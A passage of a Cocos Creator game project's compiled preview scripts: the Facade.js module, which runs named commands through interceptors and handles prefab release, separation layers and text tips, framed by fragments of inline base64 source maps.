PQUFPO09BQ00sS0FBSyxDQXdEbEI7SUFBRCxZQUFDO0NBeERELEFBd0RDLENBeEQyQixFQUFFLENBQUMsY0FBYyxHQXdENUM7QUF4RGEsc0JBQUsiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJjb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzXHJcbmV4cG9ydCAgY2xhc3MgU2hha2UgZXh0ZW5kcyBjYy5BY3Rpb25JbnRlcnZhbFxyXG57XHJcblxyXG4gICAgcHJpdmF0ZSBfaW5pdGlhbF94Om51bWJlciA9IDA7XHJcbiAgICBwcml2YXRlIF9pbml0aWFsX3k6bnVtYmVyID0gMDtcclxuICAgIHByaXZhdGUgX3N0cmVuZ3RoX3g6bnVtYmVyID0gMDtcclxuICAgIHByaXZhdGUgX3N0cmVuZ3RoX3k6bnVtYmVyID0gMDtcclxuXHJcbiAgICAvKipcclxuICAgICAqICDliJvlu7rmipbliqjliqjnlLtcclxuICAgICAqIEBwYXJhbSB7bnVtYmVyfSBkdXJhdGlvbiAgICAg5Yqo55S75oyB57ut5pe26ZW/XHJcbiAgICAgKiBAcGFyYW0ge251bWJlcn0gc3RyZW5ndGhfeCAgIOaKluWKqOW5heW6pu+8miB45pa55ZCRXHJcbiAgICAgKiBAcGFyYW0ge251bWJlcn0gc3RyZW5ndGhfeSAgIOaKluWKqOW5heW6pu+8miB55pa55ZCRXHJcbiAgICAgKiBAcmV0dXJucyB7U2hha2V9XHJcbiAgICAgKi9cclxuICAgIHB1YmxpYyBzdGF0aWMgY3JlYXRlKGR1cmF0aW9uOm51bWJlcixzdHJlbmd0aF94Om51bWJlcixzdHJlbmd0aF95Om51bWJlcik6U2hha2VcclxuICAgIHtcclxuICAgICAgICBsZXQgYWN0OlNoYWtlID0gbmV3IFNoYWtlKCk7XHJcbiAgICAgICAgYWN0LmluaXRXaXRoRHVyYXRpb24oIGR1cmF0aW9uLHN0cmVuZ3RoX3gsc3RyZW5ndGhfeSApO1xyXG4gICAgICAgIHJldHVybiBhY3Q7XHJcbiAgICB9XHJcblxyXG4gICAgcHVibGljIGluaXRXaXRoRHVyYXRpb24oZHVyYXRpb246bnVtYmVyLHN0cmVuZ3RoX3g6bnVtYmVyLHN0cmVuZ3RoX3k6bnVtYmVyKTpib29sZWFuXHJcbiAgICB7XHJcbiAgICAgICAgY2MuQWN0aW9uSW50ZXJ2YWwucHJvdG90eXBlWydpbml0V2l0aER1cmF0aW9uJ10uYXBwbHkodGhpcyxhcmd1bWVudHMpO1xyXG4gICAgICAgIHRoaXMuX3N0cmVuZ3RoX3ggPSBzdHJlbmd0aF94O1xyXG4gICAgICAgIHRoaXMuX3N0cmVuZ3RoX3kgPSBzdHJlbmd0aF95O1xyXG4gICAgICAgIHJldHVybiB0cnVlO1xyXG4gICAgfVxyXG5cclxuICAgIHB1YmxpYyBmZ1JhbmdlUmFuZChtaW46bnVtYmVyLG1heDpudW1iZXIpOm51bWJlclxyXG4gICAge1xyXG4gICAgICAgIGxldCBybmQ6bnVtYmVyID0gTWF0aC5yYW5kb20oKTtcclxuICAgICAgICByZXR1cm4gcm5kICogKG1heCAtIG1pbikgKyBtaW47XHJcbiAgICB9XHJcblxyXG4gICAgcHVibGljIHVwZGF0ZSh0aW1lOm51bWJlcik6dm9pZFxyXG4gICAge1xyXG4gICAgICAgIGxldCByYW5keCA9IHRoaXMuZmdSYW5nZVJhbmQoLXRoaXMuX3N0cmVuZ3RoX3gsdGhpcy5fc3RyZW5ndGhfeCk7XHJcbiAgICAgICAgbGV0IHJhbmR5ID0gdGhpcy5mZ1JhbmdlUmFuZCgtdGhpcy5fc3RyZW5ndGhfeSx0aGlzLl9zdHJlbmd0aF95KTtcclxuICAgICAgICB0aGlzLmdldFRhcmdldCgpLnNldFBvc2l0aW9uKHJhbmR4ICsgdGhpcy5faW5pdGlhbF94LHJhbmR5ICsgdGhpcy5faW5pdGlhbF95KTtcclxuICAgIH1cclxuXHJcbiAgICBwdWJsaWMgc3RhcnRXaXRoVGFyZ2V0KHRhcmdldDpjYy5Ob2RlKTp2b2lkXHJcbiAgICB7XHJcbiAgICAgICAgY2MuQWN0aW9uSW50ZXJ2YWwucHJvdG90eXBlWydzdGFydFdpdGhUYXJnZXQnXS5hcHBseSh0aGlzLGFyZ3VtZW50cyk7XHJcbiAgICAgICAgdGhpcy5faW5pdGlhbF94ID0gdGFyZ2V0Lng7XHJcbiAgICAgICAgdGhpcy5faW5pdGlhbF95ID0gdGFyZ2V0Lnk7XHJcbiAgICB9XHJcblxyXG4gICAgcHVibGljIHN0b3AoKTp2b2lkXHJcbiAgICB7XHJcbiAgICAgICAgdGhpcy5nZXRUYXJnZXQoKS5zZXRQb3NpdGlvbihuZXcgY2MuVmVjMih0aGlzLl9pbml0aWFsX3gsdGhpcy5faW5pdGlhbF95KSk7XHJcblxyXG4gICAgICAgIGNjLkFjdGlvbkludGVydmFsLnByb3RvdHlwZVsnc3RvcCddLmFwcGx5KHRoaXMpO1xyXG4gICAgfVxyXG59XHJcbiAiXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/facade/Facade.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'c56ebL9UHxNDoXapY+zXo32', 'Facade');
// framework/facade/Facade.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
var Extend_1 = require("../extend/Extend");
var Actions_1 = require("../actions/Actions");
var Interceptor_1 = require("../interceptor/Interceptor");
var Facade = /** @class */ (function () {
    function Facade() {
    }
    Facade.findComponent = function (nodeName, type, referenceNode) {
        referenceNode = referenceNode || this.canvasNode;
        var node = cc.find(nodeName, referenceNode);
        if (node) {
            return node.getComponent(type);
        }
    };
    Facade.executeCommand = function (name) {
        var _this = this;
        var args = [];
        for (var _i = 1; _i < arguments.length; _i++) {
            args[_i - 1] = arguments[_i];
        }
        return new Promise(function (resolve, reject) { return __awaiter(_this, void 0, void 0, function () {
            var arr, results, _loop_1, _a, _b, _i, i, state_1, results, _c, _d, _e, i, res;
            return __generator(this, function (_f) {
                switch (_f.label) {
                    case 0:
                        if (!(typeof name == "string")) return [3 /*break*/, 5];
                        arr = name.split(",");
                        results = [];
                        _loop_1 = function (i) {
                            var name_1, interceptors, flag, tempArr, _loop_2, command, res, tempArr, _loop_3;
                            return __generator(this, function (_a) {
                                switch (_a.label) {
                                    case 0:
                                        name_1 = arr[i].trim();
                                        interceptors = Interceptor_1.Interceptor.interceptorsOf(name_1);
                                        if (!(interceptors.length > 0)) return [3 /*break*/, 4];
                                        flag = true;
                                        tempArr = interceptors.slice(0);
                                        _loop_2 = function () {
                                            var commandInterceptor;
                                            return __generator(this, function (_a) {
                                                switch (_a.label) {
                                                    case 0:
                                                        commandInterceptor = tempArr.shift();
                                                        if (CC_DEBUG) {
                                                            console.log("execute preHandle===>commandName=" + name_1 + " interceptorName=" + commandInterceptor.constructor.name + " args=" + args);
                                                        }
                                                        return [4 /*yield*/, commandInterceptor.preHandle.apply(commandInterceptor, args).catch(function (reason) {
                                                                var err;
                                                                if (typeof reason == "string") {
                                                                    err = Error(reason);
                                                                }
                                                                else if (reason instanceof Error) {
                                                                    err = reason;
                                                                }
                                                                else {
                                                                    err = Error("commandName=" + name_1 + " " + commandInterceptor.constructor.name + ".preHandle()");
                                                                }
                                                                reject(err);
                                                            })];
                                                    case 1:
                                                        flag = (_a.sent()) && flag;
                                                        tempArr = tempArr.filter(function (value) { return Interceptor_1.Interceptor.interceptorsOf(name_1).some(function (value2) { return value2 == value; }); });
                                                        return [2 /*return*/];
                                                }
                                            });
                                        };
                                        _a.label = 1;
                                    case 1:
                                        if (!(tempArr.length > 0)) return [3 /*break*/, 3];
                                        return [5 /*yield**/, _loop_2()];
                                    case 2:
                                        _a.sent();
                                        return [3 /*break*/, 1];
                                    case 3:
                                        if (!flag) {
                                            return [2 /*return*/, { value: void 0 }];
                                        }
                                        _a.label = 4;
                                    case 4:
                                        if (CC_DEBUG) {
                                            console.log("execute command===>" + name_1 + " args=" + args);
                                        }
                                        command = (Extend_1.ext.createObj(name_1));
                                        if (!command) {
                                            reject(Error("createObj(" + name_1 + ")===>" + name_1 + " not found"));
                                            return [2 /*return*/, { value: void 0 }];
                                        }
                                        return [4 /*yield*/, command.execute.apply(command, args).catch(function (reason) {
                                                var err;
                                                if (typeof reason == "string") {
                                                    err = Error(reason);
                                                }
                                                else if (reason instanceof Error) {
                                                    err = reason;
                                                }
                                                else {
                                                    err = Error("command.execute()===>commandName=" + name_1);
                                                }
                                                reject(err);
                                            })];
                                    case 5:
                                        res = _a.sent();
                                        results.push(res);
                                        interceptors = Interceptor_1.Interceptor.interceptorsOf(name_1);
                                        if (!(interceptors.length > 0)) return [3 /*break*/, 8];
                                        tempArr = interceptors.slice(0);
                                        _loop_3 = function () {
                                            var commandInterceptor;
                                            return __generator(this, function (_a) {
                                                switch (_a.label) {
                                                    case 0:
                                                        commandInterceptor = tempArr.shift();
                                                        if (CC_DEBUG) {
                                                            console.log("execute postHandle===>commandName=" + name_1 + " interceptorName=" + commandInterceptor.constructor.name + " res=" + res + " args=" + args);
                                                        }
                                                        return [4 /*yield*/, commandInterceptor.postHandle.apply(commandInterceptor, __spreadArrays([res], args)).catch(function (reason) {
                                                                var err;
                                                                if (typeof reason == "string") {
                                                                    err = Error(reason);
                                                                }
                                                                else if (reason instanceof Error) {
                                                                    err = reason;
                                                                }
                                                                else {
                                                                    err = Error("commandName=" + name_1 + " " + commandInterceptor.constructor.name + ".postHandle");
                                                                }
                                                                reject(err);
                                                            })];
                                                    case 1:
                                                        _a.sent();
                                                        tempArr = tempArr.filter(function (value) { return Interceptor_1.Interceptor.interceptorsOf(name_1).some(function (value2) { return value2 == value; }); });
                                                        return [2 /*return*/];
                                                }
                                            });
                                        };
                                        _a.label = 6;
                                    case 6:
                                        if (!(tempArr.length > 0)) return [3 /*break*/, 8];
                                        return [5 /*yield**/, _loop_3()];
                                    case 7:
                                        _a.sent();
                                        return [3 /*break*/, 6];
                                    case 8:
                                        resolve(results);
                                        return [2 /*return*/];
                                }
                            });
                        };
                        _a = [];
                        for (_b in arr)
                            _a.push(_b);
                        _i = 0;
                        _f.label = 1;
                    case 1:
                        if (!(_i < _a.length)) return [3 /*break*/, 4];
                        i = _a[_i];
                        return [5 /*yield**/, _loop_1(i)];
                    case 2:
                        state_1 = _f.sent();
                        if (typeof state_1 === "object")
                            return [2 /*return*/, state_1.value];
                        _f.label = 3;
                    case 3:
                        _i++;
                        return [3 /*break*/, 1];
                    case 4: return [3 /*break*/, 11];
                    case 5:
                        if (!(name instanceof Array)) return [3 /*break*/, 10];
                        results = [];
                        _c = [];
                        for (_d in name)
                            _c.push(_d);
                        _e = 0;
                        _f.label = 6;
                    case 6:
                        if (!(_e < _c.length)) return [3 /*break*/, 9];
                        i = _c[_e];
                        return [4 /*yield*/, Facade.executeCommand.apply(Facade, __spreadArrays([name[i]], args)).catch(function (reason) { return reject(reason); })];
                    case 7:
                        res = _f.sent();
                        results.push(res);
                        _f.label = 8;
                    case 8:
                        _e++;
                        return [3 /*break*/, 6];
                    case 9:
                        resolve(results);
                        return [3 /*break*/, 11];
                    case 10:
                        reject(Error("executeCommand typeof(name)===>" + typeof name));
                        _f.label = 11;
                    case 11: return [2 /*return*/];
                }
            });
        }); });
    };
    Facade.releasePrefab = function (prefab, excludePrefab) {
        var excludes = [];
        if (excludePrefab) {
            if (typeof excludePrefab == "string") {
                excludes.push(excludePrefab);
            }
            else {
                excludes = excludePrefab;
            }
        }
        if (excludes.indexOf(prefab) >= 0) {
            console.log("release fail,this prefab in retainPrefab or excludes===>" + prefab);
            return;
        }
        var deps = cc.loader.getDependsRecursively(prefab);
        var arr = deps.filter(function (value) {
            for (var i in excludes) {
                var retainPrefab = excludes[i];
                if (cc.loader.getDependsRecursively(retainPrefab).indexOf(value) >= 0) {
                    return false;
                }
            }
            return true;
        });
        arr.forEach(function (value) {
            cc.loader.release(value);
            console.log(value, "release====>");
        });
    };
    Facade.initSeparationLayer = function (separationPrefabName) {
        return __awaiter(this, void 0, void 0, function () {
            var _a;
            return __generator(this, function (_b) {
                switch (_b.label) {
                    case 0:
                        _a = this;
                        return [4 /*yield*/, cc.loader.loadResAwait(separationPrefabName, cc.Prefab)];
                    case 1:
                        _a._separationPrefab = _b.sent();
                        return [2 /*return*/];
                }
            });
        });
    };
    /** 加入隔断层 */
    Facade.addSeparationLayer = function (groupIdx, opacity, zOrder) {
        if (groupIdx === void 0) { groupIdx = null; }
        if (opacity === void 0) { opacity = 115; }
        if (zOrder === void 0) { zOrder = 0; }
        if (this._separationPrefab == null) {
            console.error("please call Facade.initSeparationLayer before call Facade.addSeparationLayer");
            return;
        }
        var node = cc.instantiate(this._separationPrefab);
        node.setParent(this.canvasNode);
        node.position = cc.v2(0, 0);
        if (typeof opacity == "number") {
            node.opacity = opacity;
        }
        node.zIndex = zOrder;
        if (groupIdx) {
            node.groupIndex = groupIdx;
        }
        return node;
    };
    Facade.initTextTips = function (textTipsPrefabName) {
        return __awaiter(this, void 0, void 0, function () {
            var _a;
            return __generator(this, function (_b) {
                switch (_b.label) {
                    case 0:
                        _a = this;
                        return [4 /*yield*/, cc.loader.loadResAwait(textTipsPrefabName, cc.Prefab)];
                    case 1:
                        _a._textTipsPrefab = _b.sent();
                        return [2 /*return*/];
                }
            });
        });
    };
    /** 文字提示 */
    Facade.textTips = function (text, position, fontSize) {
        return __awaiter(this, void 0, void 0, function () {
            var node, richText;
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0:
                        if (this._separationPrefab == null) {
                            console.error("please call Facade.initTextTips before call Facade.textTips");
                            return [2 /*return*/];
                        }
                        node = cc.instantiate(this._textTipsPrefab);
                        node.setParent(Facade.canvasNode);
                        node.zIndex = cc.macro.MAX_ZINDEX;
                        if (position) {
                            node.position = position;
                        }
                        else {
                            node.position = cc.v2(0, 0);
                        }
                        richText = node.getComponent(cc.RichText);
                        if (fontSize) {
                            richText.fontSize = fontSize;
                        }
                        richText.string = text;
                        Extend_1.ext.showRichText(richText);
                        return [4 /*yield*/, node.runActionAwait(Actions_1.default.flutterAction())];
                    case 1:
                        _a.sent();
                        node.destroy();
                        return [2 /*return*/];
                }
            });
        });
    };
    /** 当前canvas节点 */
    Facade.canvasNode = null;
    Facade._separationPrefab = null;
    Facade._textTipsPrefab = null;
    return Facade;
}());
exports.default = Facade;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvZmFjYWRlL0ZhY2FkZS50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7QUFBQSxvQkFBb0I7QUFDcEIsaUZBQWlGO0FBQ2pGLHlGQUF5RjtBQUN6RixtQkFBbUI7QUFDbkIsMkZBQTJGO0FBQzNGLG1HQUFtRztBQUNuRyw4QkFBOEI7QUFDOUIsMkZBQTJGO0FBQzNGLG1HQUFtRzs7QUFJbkcsMkNBQXFDO0FBQ3JDLDhDQUF5QztBQUN6QywwREFBdUQ7QUFFdkQ7SUFBQTtJQW1NQSxDQUFDO0lBL0xXLG9CQUFhLEdBQXJCLFVBQXNCLFFBQWUsRUFBRSxJQUFJLEVBQUUsYUFBdUI7UUFDaEUsYUFBYSxHQUFHLGFBQWEsSUFBSSxJQUFJLENBQUMsVUFBVSxDQUFDO1FBQ2pELElBQUksSUFBSSxHQUFHLEVBQUUsQ0FBQyxJQUFJLENBQUMsUUFBUSxFQUFFLGFBQWEsQ0FBQyxDQUFDO1FBQzVDLElBQUksSUFBSSxFQUFDO1lBQ0wsT0FBTyxJQUFJLENBQUMsWUFBWSxDQUFDLElBQUksQ0FBQyxDQUFDO1NBQ2xDO0lBQ0wsQ0FBQztJQUVNLHFCQUFjLEdBQXJCLFVBQXNCLElBQW9CO1FBQTFDLGlCQXlGQztRQXpGMkMsY0FBTzthQUFQLFVBQU8sRUFBUCxxQkFBTyxFQUFQLElBQU87WUFBUCw2QkFBTzs7UUFDL0MsT0FBTyxJQUFJLE9BQU8sQ0FBQyxVQUFPLE9BQU8sRUFBRSxNQUFNOzs7Ozs2QkFDakMsQ0FBQSxPQUFPLElBQUksSUFBSSxRQUFRLENBQUEsRUFBdkIsd0JBQXVCO3dCQUNuQixHQUFHLEdBQUcsSUFBSSxDQUFDLEtBQUssQ0FBQyxHQUFHLENBQUMsQ0FBQzt3QkFDdEIsT0FBTyxHQUFHLEVBQUUsQ0FBQzs0Q0FDUixDQUFDOzs7Ozt3Q0FDRixTQUFPLEdBQUcsQ0FBQyxDQUFDLENBQUMsQ0FBQyxJQUFJLEVBQUUsQ0FBQzt3Q0FDckIsWUFBWSxHQUFHLHlCQUFXLENBQUMsY0FBYyxDQUFDLE1BQUksQ0FBQyxDQUFDOzZDQUNoRCxDQUFBLFlBQVksQ0FBQyxNQUFNLEdBQUcsQ0FBQyxDQUFBLEVBQXZCLHdCQUF1Qjt3Q0FDbkIsSUFBSSxHQUFHLElBQUksQ0FBQzt3Q0FDWixPQUFPLEdBQUcsWUFBWSxDQUFDLEtBQUssQ0FBQyxDQUFDLENBQUMsQ0FBQzs7Ozs7O3dEQUU1QixrQkFBa0IsR0FBRyxPQUFPLENBQUMsS0FBSyxFQUFFLENBQUM7d0RBQ3pDLElBQUksUUFBUSxFQUFDOzREQUNULE9BQU8sQ0FBQyxHQUFHLENBQUMsc0NBQW9DLE1BQUkseUJBQW9CLGtCQUFrQixDQUFDLFdBQVcsQ0FBQyxJQUFJLGNBQVMsSUFBTSxDQUFDLENBQUM7eURBQy9IO3dEQUNNLHFCQUFNLGtCQUFrQixDQUFDLFNBQVMsT0FBNUIsa0JBQWtCLEVBQWMsSUFBSSxFQUFFLEtBQUssQ0FBQyxVQUFBLE1BQU07Z0VBQzNELElBQUksR0FBRyxDQUFDO2dFQUNSLElBQUksT0FBTyxNQUFNLElBQUksUUFBUSxFQUFDO29FQUMxQixHQUFHLEdBQUcsS0FBSyxDQUFDLE1BQU0sQ0FBQyxDQUFDO2lFQUN2QjtxRUFBSyxJQUFHLE1BQU0sWUFBWSxLQUFLLEVBQUM7b0VBQzdCLEdBQUcsR0FBRyxNQUFNLENBQUM7aUVBQ2hCO3FFQUFJO29FQUNELEdBQUcsR0FBRyxLQUFLLENBQUMsaUJBQWUsTUFBSSxTQUFJLGtCQUFrQixDQUFDLFdBQVcsQ0FBQyxJQUFJLGlCQUFjLENBQUMsQ0FBQztpRUFDekY7Z0VBQ0QsTUFBTSxDQUFDLEdBQUcsQ0FBQyxDQUFDOzREQUNoQixDQUFDLENBQUMsRUFBQTs7d0RBVkYsSUFBSSxHQUFHLENBQUEsU0FVTCxLQUFJLElBQUksQ0FBQzt3REFDWCxPQUFPLEdBQUcsT0FBTyxDQUFDLE1BQU0sQ0FBQyxVQUFBLEtBQUssSUFBSSxPQUFBLHlCQUFXLENBQUMsY0FBYyxDQUFDLE1BQUksQ0FBQyxDQUFDLElBQUksQ0FBQyxVQUFBLE1BQU0sSUFBSSxPQUFBLE1BQU0sSUFBSSxLQUFLLEVBQWYsQ0FBZSxDQUFDLEVBQWhFLENBQWdFLENBQUMsQ0FBQzs7Ozs7Ozs2Q0FoQmpHLENBQUEsT0FBTyxDQUFDLE1BQU0sR0FBRyxDQUFDLENBQUE7Ozs7Ozt3Q0FrQnpCLElBQUksQ0FBQyxJQUFJLEVBQUM7O3lDQUVUOzs7d0NBRUwsSUFBSSxRQUFRLEVBQUM7NENBQ1QsT0FBTyxDQUFDLEdBQUcsQ0FBQyx3QkFBc0IsTUFBSSxjQUFTLElBQU0sQ0FBQyxDQUFDO3lDQUMxRDt3Q0FDRyxPQUFPLEdBQWEsQ0FBQyxZQUFHLENBQUMsU0FBUyxDQUFDLE1BQUksQ0FBQyxDQUFDLENBQUM7d0NBQzlDLElBQUcsQ0FBQyxPQUFPLEVBQUM7NENBQ1IsTUFBTSxDQUFDLEtBQUssQ0FBQyxlQUFhLE1BQUksYUFBUSxNQUFJLGVBQVksQ0FBQyxDQUFDLENBQUM7O3lDQUU1RDt3Q0FDUyxxQkFBTSxPQUFPLENBQUMsT0FBTyxPQUFmLE9BQU8sRUFBWSxJQUFJLEVBQUUsS0FBSyxDQUFDLFVBQUEsTUFBTTtnREFDakQsSUFBSSxHQUFHLENBQUM7Z0RBQ1IsSUFBSSxPQUFPLE1BQU0sSUFBSSxRQUFRLEVBQUM7b0RBQzFCLEdBQUcsR0FBRyxLQUFLLENBQUMsTUFBTSxDQUFDLENBQUM7aURBQ3ZCO3FEQUFLLElBQUcsTUFBTSxZQUFZLEtBQUssRUFBQztvREFDN0IsR0FBRyxHQUFHLE1BQU0sQ0FBQztpREFDaEI7cURBQUk7b0RBQ0QsR0FBRyxHQUFHLEtBQUssQ0FBQyxzQ0FBb0MsTUFBTSxDQUFDLENBQUM7aURBQzNEO2dEQUNELE1BQU0sQ0FBQyxHQUFHLENBQUMsQ0FBQzs0Q0FDaEIsQ0FBQyxDQUFDLEVBQUE7O3dDQVZFLEdBQUcsR0FBRyxTQVVSO3dDQUNGLE9BQU8sQ0FBQyxJQUFJLENBQUMsR0FBRyxDQUFDLENBQUM7d0NBRWxCLFlBQVksR0FBRyx5QkFBVyxDQUFDLGNBQWMsQ0FBQyxNQUFJLENBQUMsQ0FBQzs2Q0FDNUMsQ0FBQSxZQUFZLENBQUMsTUFBTSxHQUFHLENBQUMsQ0FBQSxFQUF2Qix3QkFBdUI7d0NBQ25CLE9BQU8sR0FBRyxZQUFZLENBQUMsS0FBSyxDQUFDLENBQUMsQ0FBQyxDQUFDOzs7Ozs7d0RBRTVCLGtCQUFrQixHQUFHLE9BQU8sQ0FBQyxLQUFLLEVBQUUsQ0FBQzt3REFDekMsSUFBSSxRQUFRLEVBQUM7NERBQ1QsT0FBTyxDQUFDLEdBQUcsQ0FBQyx1Q0FBcUMsTUFBSSx5QkFBb0Isa0JBQWtCLENBQUMsV0FBVyxDQUFDLElBQUksYUFBUSxHQUFHLGNBQVMsSUFBTSxDQUFDLENBQUM7eURBQzNJO3dEQUNELHFCQUFNLGtCQUFrQixDQUFDLFVBQVUsT0FBN0Isa0JBQWtCLGtCQUFZLEdBQUcsR0FBSyxJQUFJLEdBQUUsS0FBSyxDQUFDLFVBQUEsTUFBTTtnRUFDMUQsSUFBSSxHQUFHLENBQUM7Z0VBQ1IsSUFBSSxPQUFPLE1BQU0sSUFBSSxRQUFRLEVBQUM7b0VBQzFCLEdBQUcsR0FBRyxLQUFLLENBQUMsTUFBTSxDQUFDLENBQUM7aUVBQ3ZCO3FFQUFLLElBQUcsTUFBTSxZQUFZLEtBQUssRUFBQztvRUFDN0IsR0FBRyxHQUFHLE1BQU0sQ0FBQztpRUFDaEI7cUVBQUk7b0VBQ0QsR0FBRyxHQUFHLEtBQUssQ0FBQyxpQkFBZSxNQUFJLFNBQUksa0JBQWtCLENBQUMsV0FBVyxDQUFDLElBQUksZ0JBQWEsQ0FBQyxDQUFDO2lFQUN4RjtnRUFDRCxNQUFNLENBQUMsR0FBRyxDQUFDLENBQUM7NERBQ2hCLENBQUMsQ0FBQyxFQUFBOzt3REFWRixTQVVFLENBQUM7d0RBQ0gsT0FBTyxHQUFHLE9BQU8sQ0FBQyxNQUFNLENBQUMsVUFBQSxLQUFLLElBQUksT0FBQSx5QkFBVyxDQUFDLGNBQWMsQ0FBQyxNQUFJLENBQUMsQ0FBQyxJQUFJLENBQUMsVUFBQSxNQUFNLElBQUksT0FBQSxNQUFNLElBQUksS0FBSyxFQUFmLENBQWUsQ0FBQyxFQUFoRSxDQUFnRSxDQUFDLENBQUM7Ozs7Ozs7NkNBaEJqRyxDQUFBLE9BQU8sQ0FBQyxNQUFNLEdBQUcsQ0FBQyxDQUFBOzs7Ozs7d0NBbUI3QixPQUFPLENBQUMsT0FBTyxDQUFDLENBQUM7Ozs7OzttQ0F2RVAsR0FBRzs7Ozs7OztzREFBUixDQUFDOzs7Ozs7Ozs7Ozs2QkF5RUosQ0FBQSxJQUFJLFlBQVksS0FBSyxDQUFBLEVBQXJCLHlCQUFxQjt3QkFDdkIsT0FBTyxHQUFHLEVBQUUsQ0FBQzs7bUNBQ0gsSUFBSTs7Ozs7Ozt3QkFDSixxQkFBTSxNQUFNLENBQUMsY0FBYyxPQUFyQixNQUFNLGtCQUFnQixJQUFJLENBQUMsQ0FBQyxDQUFDLEdBQUssSUFBSSxHQUFFLEtBQUssQ0FBQyxVQUFBLE1BQU0sSUFBSSxPQUFBLE1BQU0sQ0FBQyxNQUFNLENBQUMsRUFBZCxDQUFjLENBQUMsRUFBQTs7d0JBQW5GLEdBQUcsR0FBRyxTQUE2RTt3QkFDdkYsT0FBTyxDQUFDLElBQUksQ0FBQyxHQUFHLENBQUMsQ0FBQzs7Ozs7O3dCQUV0QixPQUFPLENBQUMsT0FBTyxDQUFDLENBQUM7Ozt3QkFFakIsTUFBTSxDQUFDLEtBQUssQ0FBQyxpQ0FBaUMsR0FBQyxPQUFPLElBQUksQ0FBQyxDQUFDLENBQUM7Ozs7O2FBRXBFLENBQUMsQ0FBQztJQUNQLENBQUM7SUFHTSxvQkFBYSxHQUFwQixVQUFxQixNQUFhLEVBQUUsYUFBOEI7UUFDOUQsSUFBSSxRQUFRLEdBQUcsRUFBRSxDQUFDO1FBQ2xCLElBQUksYUFBYSxFQUFDO1lBQ2QsSUFBSSxPQUFPLGFBQWEsSUFBSSxRQUFRLEVBQUM7Z0JBQ2pDLFFBQVEsQ0FBQyxJQUFJLENBQUMsYUFBYSxDQUFDLENBQUM7YUFDaEM7aUJBQU07Z0JBQ0gsUUFBUSxHQUFHLGFBQWEsQ0FBQzthQUM1QjtTQUNKO1FBRUQsSUFBSSxRQUFRLENBQUMsT0FBTyxDQUFDLE1BQU0sQ0FBQyxJQUFJLENBQUMsRUFBQztZQUM5QixPQUFPLENBQUMsR0FBRyxDQUFDLDBEQUEwRCxHQUFDLE1BQU0sQ0FBQyxDQUFDO1lBQy9FLE9BQU07U0FDVDtRQUVELElBQUksSUFBSSxHQUFHLEVBQUUsQ0FBQyxNQUFNLENBQUMscUJBQXFCLENBQUMsTUFBTSxDQUFDLENBQUM7UUFDbkQsSUFBSSxHQUFHLEdBQUcsSUFBSSxDQUFDLE1BQU0sQ0FBQyxVQUFBLEtBQUs7WUFDdkIsS0FBSyxJQUFJLENBQUMsSUFBSSxRQUFRLEVBQUM7Z0JBQ25CLElBQUksWUFBWSxHQUFHLFFBQVEsQ0FBQyxDQUFDLENBQUMsQ0FBQztnQkFDL0IsSUFBRyxFQUFFLENBQUMsTUFBTSxDQUFDLHFCQUFxQixDQUFDLFlBQVksQ0FBQyxDQUFDLE9BQU8sQ0FBQyxLQUFLLENBQUMsSUFBSSxDQUFDLEVBQUM7b0JBQ2pFLE9BQU8sS0FBSyxDQUFDO2lCQUNoQjthQUNKO1lBQ0QsT0FBTyxJQUFJLENBQUM7UUFDaEIsQ0FBQyxDQUFDLENBQUM7UUFDSCxHQUFHLENBQUMsT0FBTyxDQUFDLFVBQUEsS0FBSztZQUNiLEVBQUUsQ0FBQyxNQUFNLENBQUMsT0FBTyxDQUFDLEtBQUssQ0FBQyxDQUFDO1lBQ3pCLE9BQU8sQ0FBQyxHQUFHLENBQUMsS0FBSyxFQUFFLGNBQWMsQ0FBQyxDQUFDO1FBQ3ZDLENBQUMsQ0FBQyxDQUFDO0lBQ1AsQ0FBQztJQVFZLDBCQUFtQixHQUFoQyxVQUFpQyxvQkFBMkI7Ozs7Ozt3QkFDeEQsS0FBQSxJQUFJLENBQUE7d0JBQXFCLHFCQUFNLEVBQUUsQ0FBQyxNQUFNLENBQUMsWUFBWSxDQUFDLG9CQUFvQixFQUFFLEVBQUUsQ0FBQyxNQUFNLENBQUMsRUFBQTs7d0JBQXRGLEdBQUssaUJBQWlCLEdBQUcsU0FBNkQsQ0FBQzs7Ozs7S0FDMUY7SUFFRCxZQUFZO0lBQ0wseUJBQWtCLEdBQXpCLFVBQTBCLFFBQXNCLEVBQUUsT0FBb0IsRUFBRSxNQUFpQjtRQUEvRCx5QkFBQSxFQUFBLGVBQXNCO1FBQUUsd0JBQUEsRUFBQSxhQUFvQjtRQUFFLHVCQUFBLEVBQUEsVUFBaUI7UUFDckYsSUFBSSxJQUFJLENBQUMsaUJBQWlCLElBQUksSUFB